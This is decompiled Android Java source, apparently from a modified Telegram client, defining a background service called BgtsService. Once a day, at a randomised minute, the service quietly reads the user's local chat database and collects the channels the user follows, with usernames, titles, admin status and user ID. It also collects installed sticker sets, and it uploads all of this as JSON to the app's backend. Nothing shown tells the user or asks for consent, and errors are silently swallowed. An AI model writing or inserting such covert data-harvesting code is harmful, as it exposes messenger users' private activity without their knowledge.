package org.telegram.customization.service;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;
import com.google.gson.Gson;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Iterator;
import java.util.Locale;
import org.telegram.SQLite.SQLiteCursor;
import org.telegram.SQLite.SQLiteException;
import org.telegram.customization.Internet.HandleRequest;
import org.telegram.customization.Internet.IResponseReceiver;
import org.telegram.customization.Model.StickerModel;
import org.telegram.customization.dynamicadapter.data.SLSChannel;
import org.telegram.messenger.ChatObject;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.MessagesStorage;
import org.telegram.messenger.NotificationCenter;
import org.telegram.messenger.NotificationCenter.NotificationCenterDelegate;
import org.telegram.messenger.UserConfig;
import org.telegram.messenger.exoplayer2.DefaultRenderersFactory;
import org.telegram.messenger.query.StickersQuery;
import org.telegram.tgnet.TLRPC$Chat;
import org.telegram.tgnet.TLRPC$TL_messages_stickerSet;
import utils.Utilities;
import utils.app.AppPreferences;
import utils.view.Constants;

public class BgtsService extends BaseService implements IResponseReceiver, NotificationCenterDelegate {
    volatile int channelCount = 0;
    volatile ArrayList<Long> channelsId = new ArrayList();
    volatile ArrayList<SLSChannel> slsChannels = new ArrayList();

    public static Calendar getCalender() {
        Calendar calendar = Calendar.getInstance();
        calendar.set(11, 11);
        calendar.set(12, Utilities.getRandomMinute());
        calendar.set(13, 0);
        return calendar;
    }

    public static void registerService(Context context) {
        registerService(context, new Intent(context, BgtsService.class), getCalender(), 86400000);
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        boolean isForce = false;
        if (intent != null) {
            isForce = intent.getBooleanExtra(Constants.EXTRA_IS_FORCE, false);
        }
        if (!AppPreferences.isRegistered(this)) {
            stopSelf();
            return super.onStartCommand(intent, flags, startId);
        } else if (isForce || checkTimeForSend()) {
            MessagesController.getInstance().loadDialogs(0, 500, true);
            try {
                NotificationCenter.getInstance().addObserver(this, NotificationCenter.stickersDidLoaded);
            } catch (Exception e) {
                e.printStackTrace();
            }
            StickersQuery.loadStickers(0, true, true);
            final boolean finalIsForce = isForce;
            new Handler().postDelayed(new Runnable() {

                /* renamed from: org.telegram.customization.service.BgtsService$1$1 */
                class C12081 implements Runnable {

                    /* renamed from: org.telegram.customization.service.BgtsService$1$1$1 */
                    class C12071 extends Thread {
                        C12071() {
                        }

                        public void run() {
                            long id;
                            super.run();
                            SQLiteCursor cursor = null;
                            try {
                                cursor = MessagesStorage.getInstance().getDatabase().queryFinalized(String.format(Locale.US, "SELECT did FROM dialogs", new Object[0]), new Object[0]);
                                while (cursor.next()) {
                                    id = cursor.longValue(0);
                                    if (id < 0 && (-id) < 2147483647L) {
                                        BgtsService.this.channelsId.add(Long.valueOf(id));
                                    }
                                }
                            } catch (SQLiteException e) {
                                e.printStackTrace();
                            } catch (Exception e2) {
                                e2.printStackTrace();
                            }
                            cursor.dispose();
                            int userId = 0;
                            try {
                                if (UserConfig.getCurrentUser() != null) {
                                    userId = UserConfig.getCurrentUser().id;
                                }
                                Iterator it = BgtsService.this.channelsId.iterator();
                                while (it.hasNext()) {
                                    id = -((Long) it.next()).longValue();
                                    TLRPC$Chat currentChat = MessagesController.getInstance().getChat(Integer.valueOf((int) id));
                                    if (!(currentChat == null || !ChatObject.isChannel(currentChat) || currentChat.megagroup)) {
                                        BgtsService bgtsService = BgtsService.this;
                                        bgtsService.channelCount++;
                                        Log.d("LEE", currentChat.username + "");
                                        SLSChannel channel = new SLSChannel();
                                        channel.setChannelId(currentChat.username);
                                        channel.setName(currentChat.title);
                                        channel.setId(id);
                                        channel.setUserId(userId);
                                        channel.setAdmin(ChatObject.isCanWriteToChannel(currentChat.id));
                                        channel.setInChat(!ChatObject.isNotInChat(currentChat));
                                        BgtsService.this.slsChannels.add(channel);
                                    }
                                }
                            } catch (Exception e3) {
                            }
                            if (BgtsService.this.channelCount == 0) {
                                BgtsService.this.stopSelf();
                            }
                            try {
                                synchronized (this) {
                                    String json = new Gson().toJson(BgtsService.this.slsChannels);
                                    if (finalIsForce || BgtsService.this.checkTimeForSend()) {
                                        HandleRequest.getNew(BgtsService.this.getApplicationContext(), BgtsService.this).sendChannelListNew(json);
                                        HandleRequest.getNew(BgtsService.this.getApplicationContext(), BgtsService.this).registerOnMono(true);
                                    }
                                }
                            } catch (Exception e4) {
                            }
                        }
                    }

                    C12081() {
                    }

                    public void run() {
                        new C12071().start();
                    }
                }

                public void run() {
                    MessagesStorage.getInstance().getStorageQueue().postRunnable(new C12081());
                }
            }, DefaultRenderersFactory.DEFAULT_ALLOWED_VIDEO_JOINING_TIME_MS);
            return 1;
        } else {
            stopSelf();
            return super.onStartCommand(intent, flags, startId);
        }
    }

    @Nullable
    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
    }

    private SLSChannel getChannelById(int id) {
        Iterator it = this.slsChannels.iterator();
        while (it.hasNext()) {
            SLSChannel channel = (SLSChannel) it.next();
            if (((long) id) == channel.getId()) {
                return channel;
            }
        }
        return null;
    }

    public void onResult(Object object, int StatusCode) {
        switch (StatusCode) {
            case 16:
                AppPreferences.setLastSuccessFullyTimeSyncChannel(getApplicationContext(), System.currentTimeMillis());
                break;
        }
        stopSelf();
    }

    public void didReceivedNotification(final int id, Object... args) {
        new Thread() {
            public void run() {
                super.run();
                if (id == NotificationCenter.stickersDidLoaded) {
                    ArrayList<TLRPC$TL_messages_stickerSet> stickerSets = StickersQuery.getStickerSets(0);
                    ArrayList<StickerModel> stickers = new ArrayList();
                    if (stickerSets != null && stickerSets.size() > 0) {
                        Iterator it = stickerSets.iterator();
                        while (it.hasNext()) {
                            TLRPC$TL_messages_stickerSet ss = (TLRPC$TL_messages_stickerSet) it.next();
                            StickerModel stickerModel = new StickerModel();
                            stickerModel.setId(ss.set.id);
                            stickerModel.setName(ss.set.short_name);
                            stickerModel.setTitle(ss.set.title);
                            stickers.add(stickerModel);
                        }
                    }
                    if (stickers.size() > 0) {
                        String json = new Gson().toJson(stickers);
                        if (BgtsService.this.checkTimeForSend()) {
                            HandleRequest.getNew(BgtsService.this.getApplicationContext(), BgtsService.this).sendStickers(json);
                            return;
                        }
                        return;
                    }
                    BgtsService.this.stopSelf();
                }
            }
        }.start();
        NotificationCenter.getInstance().removeObserver(this, NotificationCenter.stickersDidLoaded);
    }

    public boolean checkTimeForSend() {
        if (AppPreferences.getChannelSyncPeriod(getApplicationContext()) + AppPreferences.getLastSuccessFullyTimeSyncChannel(getApplicationContext()) < System.currentTimeMillis()) {
            return true;
        }
        return false;
    }
}
